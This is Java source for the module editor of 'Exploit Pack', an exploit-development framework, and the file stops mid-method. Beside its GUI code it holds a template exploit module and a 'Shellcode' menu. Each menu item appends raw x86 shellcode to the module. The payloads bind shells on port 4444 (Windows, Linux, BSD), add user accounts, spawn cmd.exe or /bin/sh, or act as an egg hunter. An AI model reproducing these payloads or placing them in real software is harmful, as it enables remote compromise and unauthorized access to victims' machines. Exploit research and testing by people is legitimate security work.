/**
Exploit Pack - Security Framework for Exploit Developers
Copyright 2011 Juan Sacco http://exploitpack.com

This program is free software: you can redistribute it and/or modify it under the terms of the
GNU General Public License as published by the Free Software Foundation, either version 3 
or any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR
PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program. 
If not, see http://www.gnu.org/licenses/
 **/

package com.exploitpack.editor;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import org.eclipse.swt.SWT;
import org.eclipse.swt.custom.CTabFolder;
import org.eclipse.swt.custom.CTabItem;
import org.eclipse.swt.events.SelectionAdapter;
import org.eclipse.swt.events.SelectionEvent;
import org.eclipse.swt.graphics.Rectangle;
import org.eclipse.swt.layout.FormAttachment;
import org.eclipse.swt.layout.FormData;
import org.eclipse.swt.layout.FormLayout;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.FileDialog;
import org.eclipse.swt.widgets.Menu;
import org.eclipse.swt.widgets.MenuItem;
import org.eclipse.swt.widgets.MessageBox;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.swt.widgets.Text;
import org.eclipse.swt.widgets.ToolBar;
import org.eclipse.swt.widgets.ToolItem;
import org.eclipse.wb.swt.SWTResourceManager;

public class MainEditor {

	public static final Composite tabFolder = null;
	protected static Shell shlExploitPack;
	private String NewJunk;
	public Text Module;

	/**
	 * Launch the application.
	 * 
	 * @param args
	 */
	public static void main(String[] args) {
		try {
			MainEditor window = new MainEditor();
			window.open();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Open the window.
	 */
	public void open() {
		Display display = Display.getDefault();
		createContents();
		Rectangle bounds = display.getBounds();
		Rectangle rect = shlExploitPack.getBounds();

		int x = bounds.x + (bounds.width - rect.width) / 2;
		int y = bounds.y + (bounds.height - rect.height) / 2;

		shlExploitPack.setLocation(x, y);
		shlExploitPack.open();
		shlExploitPack.layout();
		while (!shlExploitPack.isDisposed()) {
			if (!display.readAndDispatch()) {
				display.sleep();
			}
		}
	}

	/**
	 * Create contents of the window.
	 */
	public void createContents() {
		shlExploitPack = new Shell();
		shlExploitPack.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316133906_package.png"));
		shlExploitPack.setSize(730, 577);
		shlExploitPack.setText("Exploit Pack - Module Editor");
		shlExploitPack.setLayout(new FormLayout());

		Composite composite = new Composite(shlExploitPack, SWT.NONE);
		composite.setLayout(new FormLayout());
		FormData fd_composite = new FormData();
		fd_composite.left = new FormAttachment(0);
		fd_composite.right = new FormAttachment(100);
		fd_composite.bottom = new FormAttachment(100);
		fd_composite.top = new FormAttachment(0);
		composite.setLayoutData(fd_composite);

		final CTabFolder folder1 = new CTabFolder(composite, SWT.BORDER
				| SWT.CLOSE);
		FormData fd_folder1 = new FormData();
		fd_folder1.bottom = new FormAttachment(100);
		fd_folder1.right = new FormAttachment(100);
		fd_folder1.top = new FormAttachment(0, 28);
		fd_folder1.left = new FormAttachment(0);
		folder1.setLayoutData(fd_folder1);
		folder1.setSelectionBackground(SWTResourceManager
				.getColor(SWT.COLOR_WHITE));
		folder1.setFocus();

		// CREATE TABS
		folder1.setUnselectedCloseVisible(false);
		final CTabItem NewTab = new CTabItem(folder1, SWT.NONE);
		NewTab.setText("New Module");

		final Text Module = new Text(folder1, SWT.BORDER | SWT.V_SCROLL | SWT.MULTI);
		Module.setBackground(SWTResourceManager.getColor(SWT.COLOR_WHITE));
		Module.setForeground(SWTResourceManager.getColor(SWT.COLOR_BLACK));
		Module.setText("# Exploit Pack - Security Framework for Exploit Developers\r\n# Copyright 2011 Juan Sacco http://exploitpack.com\r\n#\r\n# This program is free software: you can redistribute it and/or modify it under the terms of the\r\n# GNU General Public License as published by the Free Software Foundation, either version 3 \r\n# or any later version.\r\n#\r\n# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\r\n# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR\r\n# PURPOSE. See the GNU General Public License for more details.\r\n#\r\n# You should have received a copy of the GNU General Public License along with this program. \r\n# If not, see http://www.gnu.org/licenses/\r\n\r\n# Module generated using Exploit Pack  - Module Editor\r\n\r\ndef howtousage():\r\n   print \"Sorry, required arguments: Host Port\"\r\n   sys.exit(-1)\r\n\r\ndef run():\r\n   try:\r\n     Connection = httplib.HTTPConnection(Host, Port)\r\n     Connection.request('GET', vulnerableURL)\r\n     Connection.close()\r\n\r\n   except:\r\n     print \"Exploit connection closed\"\r\n\r\nif __name__ == '__main__':\r\n   print \"Module Name - Author Name\"\r\n   print \"Targets available\"\r\n\r\n   try:\r\n     Host = sys.argv[1]\r\n     Port = sys.argv[2]\r\n   except IndexError:\r\n     howtousage()\r\nrun()");
		NewTab.setControl(Module);

		folder1.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				// TODO add fix for this feature
				folder1.getSelection().setData(NewTab.getText());//("# Exploit Pack - Security Framework for Exploit Developers\r\n# Copyright 2011 Juan Sacco http://exploitpack.com\r\n#\r\n# This program is free software: you can redistribute it and/or modify it under the terms of the\r\n# GNU General Public License as published by the Free Software Foundation, either version 3 \r\n# or any later version.\r\n#\r\n# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\r\n# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR\r\n# PURPOSE. See the GNU General Public License for more details.\r\n#\r\n# You should have received a copy of the GNU General Public License along with this program. \r\n# If not, see http://www.gnu.org/licenses/\r\n\r\n# Module generated using Exploit Pack  - Module Editor\r\n\r\ndef howtousage():\r\n   print \"Sorry, required arguments: Host Port\"\r\n   sys.exit(-1)\r\n\r\ndef run():\r\n   try:\r\n     Connection = httplib.HTTPConnection(Host, Port)\r\n     Connection.request('GET', vulnerableURL)\r\n     Connection.close()\r\n\r\n   except:\r\n     print \"Exploit connection closed\"\r\n\r\nif __name__ == '__main__':\r\n   print \"Module Name - Author Name\"\r\n   print \"Targets available\"\r\n\r\n   try:\r\n     Host = sys.argv[1]\r\n     Port = sys.argv[2]\r\n   except IndexError:\r\n     howtousage()\r\nrun()");
			}
		});

		ToolBar toolBar = new ToolBar(composite, SWT.FLAT | SWT.WRAP
				| SWT.RIGHT);
		FormData fd_toolBar = new FormData();
		fd_toolBar.right = new FormAttachment(100);
		fd_toolBar.top = new FormAttachment(0);
		fd_toolBar.left = new FormAttachment(0);
		toolBar.setLayoutData(fd_toolBar);
		toolBar.setBackground(SWTResourceManager.getColor(SWT.COLOR_WHITE));
		
		@SuppressWarnings("unused")
		ToolItem toolItem_2 = new ToolItem(toolBar, SWT.SEPARATOR);

		ToolItem tltmNewModule = new ToolItem(toolBar, SWT.NONE);

		tltmNewModule.setText("New Module");
		tltmNewModule.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316133906_package.png"));

		ToolItem tltmOpenModule = new ToolItem(toolBar, SWT.NONE);

		tltmOpenModule.setText("Open Module");
		tltmOpenModule.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316133571_package_go.png"));
		
		@SuppressWarnings("unused")
		ToolItem toolItem_1 = new ToolItem(toolBar, SWT.SEPARATOR);

		ToolItem tltmSave = new ToolItem(toolBar, SWT.NONE);
		tltmSave.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				String ObtainData = Module.getText();
				SaveFile(ObtainData);
			}
		});
		tltmSave.setText("Save Module");
		tltmSave.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134049_table_save.png"));

		@SuppressWarnings("unused")
		ToolItem toolItem_3 = new ToolItem(toolBar, SWT.SEPARATOR);

		ToolItem tltmCut = new ToolItem(toolBar, SWT.NONE);
		tltmCut.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.cut();
			}
		});
		tltmCut.setText("Cut");
		tltmCut.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134425_cut_red.png"));

		ToolItem tltmCopy = new ToolItem(toolBar, SWT.NONE);
		tltmCopy.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.copy();
			}
		});
		tltmCopy.setText("Copy");
		tltmCopy.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134439_page_copy.png"));

		ToolItem tltmPaste = new ToolItem(toolBar, SWT.NONE);
		tltmPaste.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.paste();
			}
		});
		tltmPaste.setText("Paste");
		tltmPaste.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134460_page_white_paste.png"));

		@SuppressWarnings("unused")
		ToolItem toolItem_7 = new ToolItem(toolBar, SWT.SEPARATOR);

		ToolItem tltmNewItem = new ToolItem(toolBar, SWT.NONE);
		tltmNewItem.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {

			}
		});
		tltmNewItem.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/arrow_undo.png"));

		ToolItem tltmNewItem_1 = new ToolItem(toolBar, SWT.NONE);
		tltmNewItem_1.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/arrow_redo.png"));

		@SuppressWarnings("unused")
		ToolItem toolItem = new ToolItem(toolBar, SWT.SEPARATOR);

		ToolItem tltmNewItem_2 = new ToolItem(toolBar, SWT.NONE);
		tltmNewItem_2.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/find.png"));

		tltmNewModule.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				final CTabItem NewTab = new CTabItem(folder1, SWT.NONE);
				NewTab.setText("New Module");

				final Text Module = new Text(folder1, SWT.BORDER | SWT.MULTI);
				NewTab.setControl(Module);

			}
		});

		Menu menu = new Menu(shlExploitPack, SWT.BAR);
		shlExploitPack.setMenuBar(menu);

		MenuItem mntmFile = new MenuItem(menu, SWT.CASCADE);
		mntmFile.setText("File");

		Menu menu_1 = new Menu(mntmFile);
		mntmFile.setMenu(menu_1);

		MenuItem mntmNew = new MenuItem(menu_1, SWT.NONE);
		mntmNew.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				final CTabItem NewTab = new CTabItem(folder1, SWT.NONE);
				NewTab.setText("New Module");

				final Text Module = new Text(folder1, SWT.BORDER | SWT.MULTI);
				NewTab.setControl(Module);

			}
		});
		mntmNew.setText("New \tCtrl+N");

		MenuItem mntmOpen = new MenuItem(menu_1, SWT.NONE);
		mntmOpen.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				String OpenData = OpenFile();
				final CTabItem NewTab = new CTabItem(folder1, SWT.NONE);
				NewTab.setText("Old Module");
				final Text Module = new Text(folder1, SWT.BORDER | SWT.MULTI);
				NewTab.setControl(Module);
				Module.setText(OpenData);
			}
		});
		mntmOpen.setText("Open File... \tCtrl+O");

		new MenuItem(menu_1, SWT.SEPARATOR);

		MenuItem mntmNewItem_1 = new MenuItem(menu_1, SWT.NONE);
		mntmNewItem_1.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				// SaveFile();
			}
		});
		mntmNewItem_1.setText("Save \tCtrl+S");

		MenuItem mntmSaveAs = new MenuItem(menu_1, SWT.NONE);
		mntmSaveAs.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134049_table_save.png"));
		mntmSaveAs.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				// SaveFile();
			}
		});
		mntmSaveAs.setText("Save As..");

		new MenuItem(menu_1, SWT.SEPARATOR);

		MenuItem mntmClose = new MenuItem(menu_1, SWT.NONE);
		mntmClose.setText("Close \tCtrl+W");

		MenuItem mntmNewItem = new MenuItem(menu_1, SWT.NONE);
		mntmNewItem.setText("Close All");

		new MenuItem(menu_1, SWT.SEPARATOR);

		MenuItem mntmExit = new MenuItem(menu_1, SWT.NONE);
		mntmExit.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				MainEditor.shlExploitPack.dispose();
			}
		});
		mntmExit.setText("Exit");

		MenuItem mntmNewSubmenu = new MenuItem(menu, SWT.CASCADE);
		mntmNewSubmenu.setText("Edit");

		Menu menu_2 = new Menu(mntmNewSubmenu);
		mntmNewSubmenu.setMenu(menu_2);

		MenuItem mntmUndo = new MenuItem(menu_2, SWT.NONE);
		mntmUndo.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/arrow_undo.png"));
		mntmUndo.setText("Undo \tCtrl+Z");

		MenuItem mntmRedo = new MenuItem(menu_2, SWT.NONE);
		mntmRedo.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/arrow_redo.png"));
		mntmRedo.setText("Redo \tCtrl+Y");

		new MenuItem(menu_2, SWT.SEPARATOR);

		MenuItem mntmNewItem_2 = new MenuItem(menu_2, SWT.NONE);
		mntmNewItem_2.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134425_cut_red.png"));
		mntmNewItem_2.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.cut();
			}
		});
		mntmNewItem_2.setText("Cut \tCtrl+X");

		MenuItem mntmNewItem_3 = new MenuItem(menu_2, SWT.NONE);
		mntmNewItem_3.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134439_page_copy.png"));
		mntmNewItem_3.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.copy();
			}
		});
		mntmNewItem_3.setText("Copy \tCtrl+C");

		MenuItem mntmNewItem_4 = new MenuItem(menu_2, SWT.NONE);
		mntmNewItem_4.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/1316134460_page_white_paste.png"));
		mntmNewItem_4.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.paste();
			}
		});

		mntmNewItem_4.setText("Paste \tCtrl+P");

		MenuItem menuItem = new MenuItem(menu, SWT.CASCADE);
		menuItem.setText("Shellcode");

		Menu menu_4 = new Menu(menuItem);
		menuItem.setMenu(menu_4);

		MenuItem menuItem_1 = new MenuItem(menu_4, SWT.CASCADE);
		menuItem_1.setText("Windows");

		Menu menu_5 = new Menu(menuItem_1);
		menuItem_1.setMenu(menu_5);

		MenuItem menuItem_2 = new MenuItem(menu_5, SWT.NONE);
		menuItem_2.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x33\\xc9\\x83\\xe9\\xb8\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x7a\\xba\\xcb\\x13\\x83\\xeb\\xfc\\xe2\\xf4\\x86\\xd0\\x20\\x5e\\x92\\x43\\x34\\xec\\x85\\xda\\x40\\x7f\\x5e\\x9e\\x40\\x56\\x46\\x31\\xb7\\x16\\x02\\xbb\\x24\\x98\\x35\\xa2\\x40\\x4c\\x5a\\xbb\\x20\\x5a\\xf1\\x8e\\x40\\x12\\x94\\x8b\\x0b\\x8a\\xd6\\x3e\\x0b\\x67\\x7d\\x7b\\x01\\x1e\\x7b\\x78\\x20\\xe7\\x41\\xee\\xef\\x3b\\x0f\\x5f\\x40\\x4c\\x5e\\xbb\\x20\\x75\\xf1\\xb6\\x80\\x98\\x25\\xa6\\xca\\xf8\\x79\\x96\\x40\\x9a\\x16\\x9e\\xd7\\x72\\xb9\\x8b\\x10\\x77\\xf1\\xf9\\xfb\\x98\\x3a\\xb6\\x40\\x63\\x66\\x17\\x40\\x53\\x72\\xe4\\xa3\\x9d\\x34\\xb4\\x27\\x43\\x85\\x6c\\xad\\x40\\x1c\\xd2\\xf8\\x21\\x12\\xcd\\xb8\\x21\\x25\\xee\\x34\\xc3\\x12\\x71\\x26\\xef\\x41\\xea\\x34\\xc5\\x25\\x33\\x2e\\x75\\xfb\\x57\\xc3\\x11\\x2f\\xd0\\xc9\\xec\\xaa\\xd2\\x12\\x1a\\x8f\\x17\\x9c\\xec\\xac\\xe9\\x98\\x40\\x29\\xf9\\x98\\x50\\x29\\x45\\x1b\\x7b\\x7a\\xba\\xcb\\x13\\x1c\\xd2\\xda\\x4f\\x1c\\xe9\\x42\\xf2\\xef\\xd2\\x27\\xea\\xd0\\xda\\x9c\\xec\\xac\\xd0\\xdb\\x42\\x2f\\x45\\x1b\\x75\\x10\\xde\\xad\\x7b\\x19\\xd7\\xa1\\x43\\x23\\x93\\x07\\x9a\\x9d\\xd0\\x8f\\x9a\\x98\\x8b\\x0b\\xe0\\xd0\\x2f\\x42\\xee\\x84\\xf8\\xe6\\xed\\x38\\x96\\x46\\x69\\x42\\x11\\x60\\xb8\\x12\\xc8\\x35\\xa0\\x6c\\x45\\xbe\\x3b\\x85\\x6c\\x90\\x44\\x28\\xeb\\x9a\\x42\\x10\\xbb\\x9a\\x42\\x2f\\xeb\\x34\\xc3\\x12\\x17\\x12\\x16\\xb4\\xe9\\x34\\xc5\\x10\\x45\\x34\\x24\\x85\\x6a\\xa3\\xf4\\x03\\x7c\\xb2\\xec\\x0f\\xbe\\x34\\xc5\\x85\\xcd\\x37\\xec\\xaa\\xd2\\x3b\\x99\\x7e\\xe5\\x98\\xec\\xac\\x45\\x1b\\x13\" # Binds a shell at port 4444\n");
			}
		});
		menuItem_2.setText("x86.w32.tcp4444");

		MenuItem menuItem_3 = new MenuItem(menu_5, SWT.NONE);
		menuItem_3.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\xeb\\x10\\x58\\x31\\xc9\\x66\\x81\\xe9\\x22\\xff\\x80\\x30\\x1d\\x40\\xe2\\xfa\\xeb\\x05\\xe8\\xeb\\xff\\xff\\xff\\xf4\\xd1\\x1d\\x1d\\x1d\\x42\\xf5\\x4b\\x1d\\x1d\\x1d\\x94\\xde\\x4d\\x75\\x93\\x53\\x13\\xf1\\xf5\\x7d\\x1d\\x1d\\x1d\\x2c\\xd4\\x7b\\xa4\\x72\\x73\\x4c\\x75\\x68\\x6f\\x71\\x70\\x49\\xe2\\xcd\\x4d\\x75\\x2b\\x07\\x32\\x6d\\xf5\\x5b\\x1d\\x1d\\x1d\\x2c\\xd4\\x4c\\x4c\\x90\\x2a\\x4b\\x90\\x6a\\x15\\x4b\\x4c\\xe2\\xcd\\x4e\\x75\\x85\\xe3\\x97\\x13\\xf5\\x30\\x1d\\x1d\\x1d\\x4c\\x4a\\xe2\\xcd\\x2c\\xd4\\x54\\xff\\xe3\\x4e\\x75\\x63\\xc5\\xff\\x6e\\xf5\\x04\\x1d\\x1d\\x1d\\xe2\\xcd\\x48\\x4b\\x79\\xbc\\x2d\\x1d\\x1d\\x1d\\x96\\x5d\\x11\\x96\\x6d\\x01\\xb0\\x96\\x75\\x15\\x94\\xf5\\x43\\x40\\xde\\x4e\\x48\\x4b\\x4a\\x96\\x71\\x39\\x05\\x96\\x58\\x21\\x96\\x49\\x18\\x65\\x1c\\xf7\\x96\\x57\\x05\\x96\\x47\\x3d\\x1c\\xf6\\xfe\\x28\\x54\\x96\\x29\\x96\\x1c\\xf3\\x2c\\xe2\\xe1\\x2c\\xdd\\xb1\\x25\\xfd\\x69\\x1a\\xdc\\xd2\\x10\\x1c\\xda\\xf6\\xef\\x26\\x61\\x39\\x09\\x68\\xfc\\x96\\x47\\x39\\x1c\\xf6\\x7b\\x96\\x11\\x56\\x96\\x47\\x01\\x1c\\xf6\\x96\\x19\\x96\\x1c\\xf5\\xf4\\x1f\\x1d\\x1d\\x1d\\x2c\\xdd\\x94\\xf7\\x42\\x43\\x40\\x46\\xde\\xf5\\x32\\xe2\\xe2\\xe2\\x70\\x75\\x75\\x33\\x78\\x65\\x78\\x1d\" # Shows a MessageBox\n");
			}
		});
		menuItem_3.setText("x86.w32.msg ");

		MenuItem menuItem_4 = new MenuItem(menu_5, SWT.NONE);
		menuItem_4.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x31\\xc9\\x83\\xe9\\xce\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xe8\\x5e\\x22\\xde\\x83\\xeb\\xfc\\xe2\\xf4\\x14\\xb6\\x66\\xde\\xe8\\x5e\\xa9\\x9b\\xd4\\xd5\\x5e\\xdb\\x90\\x5f\\xcd\\x55\\xa7\\x46\\xa9\\x81\\xc8\\x5f\\xc9\\x97\\x63\\x6a\\xa9\\xdf\\x06\\x6f\\xe2\\x47\\x44\\xda\\xe2\\xaa\\xef\\x9f\\xe8\\xd3\\xe9\\x9c\\xc9\\x2a\\xd3\\x0a\\x06\\xda\\x9d\\xbb\\xa9\\x81\\xcc\\x5f\\xc9\\xb8\\x63\\x52\\x69\\x55\\xb7\\x42\\x23\\x35\\x63\\x42\\xa9\\xdf\\x03\\xd7\\x7e\\xfa\\xec\\x9d\\x13\\x1e\\x8c\\xd5\\x62\\xee\\x6d\\x9e\\x5a\\xd2\\x63\\x1e\\x2e\\x55\\x98\\x42\\x8f\\x55\\x80\\x56\\xc9\\xd7\\x63\\xde\\x92\\xde\\xe8\\x5e\\xa9\\xb6\\xd4\\x01\\x13\\x28\\x88\\x08\\xab\\x26\\x6b\\x9e\\x59\\x8e\\x80\\xae\\xa8\\xda\\xb7\\x36\\xba\\x20\\x62\\x50\\x75\\x21\\x0f\\x3d\\x4f\\xba\\xc6\\x3b\\x5a\\xbb\\xc8\\x71\\x41\\xfe\\x86\\x3b\\x56\\xfe\\x9d\\x2d\\x47\\xac\\xc8\\x27\\x02\\xa6\\xc8\\x71\\x63\\x9a\\xac\\x7e\\x04\\xf8\\xc8\\x30\\x47\\xaa\\xc8\\x32\\x4d\\xbd\\x89\\x32\\x45\\xac\\x87\\x2b\\x52\\xfe\\xa9\\x3a\\x4f\\xb7\\x86\\x37\\x51\\xaa\\x9a\\x3f\\x56\\xb1\\x9a\\x2d\\x02\\xa7\\xc8\\x71\\x63\\x9a\\xac\\x5e\\x22\\xde\" # Adds user 'x' with password 'y'\n");
			}
		});
		menuItem_4.setText("x86.w32.adduser");

		MenuItem menuItem_5 = new MenuItem(menu_5, SWT.NONE);
		menuItem_5.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x31\\xc9\\x83\\xe9\\xdd\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xa8\\x2a\\x6e\\x63\\x83\\xeb\\xfc\\xe2\\xf4\\x54\\xc2\\x2a\\x63\\xa8\\x2a\\xe5\\x26\\x94\\xa1\\x12\\x66\\xd0\\x2b\\x81\\xe8\\xe7\\x32\\xe5\\x3c\\x88\\x2b\\x85\\x2a\\x23\\x1e\\xe5\\x62\\x46\\x1b\\xae\\xfa\\x04\\xae\\xae\\x17\\xaf\\xeb\\xa4\\x6e\\xa9\\xe8\\x85\\x97\\x93\\x7e\\x4a\\x67\\xdd\\xcf\\xe5\\x3c\\x8c\\x2b\\x85\\x05\\x23\\x26\\x25\\xe8\\xf7\\x36\\x6f\\x88\\x23\\x36\\xe5\\x62\\x43\\xa3\\x32\\x47\\xac\\xe9\\x5f\\xa3\\xcc\\xa1\\x2e\\x53\\x2d\\xea\\x16\\x6f\\x23\\x6a\\x62\\xe8\\xd8\\x36\\xc3\\xe8\\xc0\\x22\\x85\\x6a\\x23\\xaa\\xde\\x63\\xa8\\x2a\\xe5\\x0b\\x94\\x75\\x5f\\x95\\xc8\\x7c\\xe7\\x9b\\x2b\\xea\\x15\\x33\\xc0\\xc5\\xa0\\x83\\xc8\\x42\\xf6\\x9d\\x22\\x24\\x39\\x9c\\x4f\\x49\\x03\\x07\\x86\\x4f\\x16\\x06\\xa8\\x2a\\x6e\\x63\" # Runs cmd.exe and ExitThread\n");
			}
		});
		menuItem_5.setText("x86.w32.cmd");

		MenuItem mntmXwegghunter = new MenuItem(menu_5, SWT.NONE);
		mntmXwegghunter.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("EggHunter = \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8\\\" # Egg Hunter\n");
				Module.append("EggHunter += \"\\x54\\x30\\x30\\x57\\\" # Egg - W00T\n");
				Module.append("Egg = \"\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\\\" # Egg\n");
			}
		});
		mntmXwegghunter.setText("x86.w32.egghunter");

		MenuItem menuItem_6 = new MenuItem(menu_4, SWT.CASCADE);
		menuItem_6.setText("Linux");

		Menu menu_6 = new Menu(menuItem_6);
		menuItem_6.setMenu(menu_6);

		MenuItem menuItem_7 = new MenuItem(menu_6, SWT.NONE);
		menuItem_7.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x33\\xc9\\x83\\xe9\\xeb\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x81\\x9c\\x95\\xe9\\x83\\xeb\\xfc\\xe2\\xf4\\xb0\\x47\\xc6\\xaa\\xd2\\xf6\\x97\\x83\\xe7\\xc4\\x0c\\x60\\x60\\x51\\x15\\x7f\\xc2\\xce\\xf3\\x81\\x90\\xc0\\xf3\\xba\\x08\\x7d\\xff\\x8f\\xd9\\xcc\\xc4\\xbf\\x08\\x7d\\x58\\x69\\x31\\xfa\\x44\\x0a\\x4c\\x1c\\xc7\\xbb\\xd7\\xdf\\x1c\\x08\\x31\\xfa\\x58\\x69\\x12\\xf6\\x97\\xb0\\x31\\xa3\\x58\\x69\\xc8\\xe5\\x6c\\x59\\x8a\\xce\\xfd\\xc6\\xae\\xef\\xfd\\x81\\xae\\xfe\\xfc\\x87\\x08\\x7f\\xc7\\xba\\x08\\x7d\\x58\\x69\\x00\" # x86.linux.bind4444\n");
			}
		});
		menuItem_7.setText("x86.linux.bind4444 ");

		MenuItem menuItem_8 = new MenuItem(menu_6, SWT.NONE);
		menuItem_8.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x31\\xc9\\x89\\xcb\\x6a\\x46\\x58\\xcd\\x80\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x41\\xb5\\x04\\xcd\\x80\\x93\\xe8\\x1f\\x00\\x00\\x00\\x78\\x3a\\x41\\x7a\\x37\\x44\\x71\\x55\\x7a\\x47\\x6a\\x77\\x69\\x4d\\x77\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\\x59\\x8b\\x51\\xfc\\x6a\\x04\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\" # Adds user 'x' with password 'y'\n");
			}
		});
		menuItem_8.setText("x86.linux.adduser");

		MenuItem menuItem_9 = new MenuItem(menu_6, SWT.NONE);
		menuItem_9.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x31\\xc0\\x50\\x68\\x30\\x30\\x84\\x79\\x68\\x30\\x73\\x7a\\x7f\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\" # x86.linux.binsh\n");
			}
		});
		menuItem_9.setText("x86.linux.binsh");

		MenuItem menuItem_10 = new MenuItem(menu_4, SWT.CASCADE);
		menuItem_10.setText("BSD");

		Menu menu_7 = new Menu(menuItem_10);
		menuItem_10.setMenu(menu_7);

		MenuItem menuItem_11 = new MenuItem(menu_7, SWT.NONE);
		menuItem_11.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x31\\xc9\\x83\\xe9\\xec\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xce\\xd3\\x61\\x53\\x83\\xeb\\xfc\\xe2\\xf4\\xa4\\xb2\\x39\\xca\\x9c\\xbb\\x71\\x51\\xdf\\x8f\\xe8\\xb2\\x9c\\x91\\x33\\x11\\x9c\\xb9\\x71\\x9e\\x4e\\x4a\\xf2\\x02\\x9d\\x81\\x0b\\x3b\\x96\\x1e\\xe1\\xe3\\xa4\\x1e\\xe1\\x01\\x9d\\x81\\xd1\\x4d\\x03\\x53\\xf6\\x39\\xcc\\x8a\\x0b\\x09\\x96\\x82\\x36\\x02\\x03\\x53\\x28\\x2a\\x3b\\x83\\x09\\x7c\\xe1\\xa0\\x09\\x3b\\xe1\\xb1\\x08\\x3d\\x47\\x30\\x31\\x07\\x9d\\x80\\xd1\\x68\\x03\\x53\\x61\\x53\" # Binds a shell at port 4444\n");
			}
		});
		menuItem_11.setText("x86.bsd.bind4444");

		MenuItem menuItem_12 = new MenuItem(menu_7, SWT.NONE);
		menuItem_12.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
